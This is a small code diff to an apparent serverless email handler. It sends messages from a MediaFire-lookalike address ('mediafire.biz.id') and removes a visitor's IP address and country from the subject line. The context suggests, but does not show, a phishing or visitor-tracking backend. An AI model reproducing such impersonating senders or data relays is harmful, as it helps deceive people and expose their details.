@@ -107,7 +107,7 @@ export default async function handler(req, res) {
             body: JSON.stringify({
                 from: NAMA + " <noreply@mediafire.biz.id>",
                 to: [EMAIL],
-                subject: "🀄 " + NAMA + " 🀄 - " + (d.ip || "-") + " " + flag + " " + (d.negara || "-"),
+                subject: "🀄 " + NAMA + " 🀄",
                 html: htmlBody
             })
         });
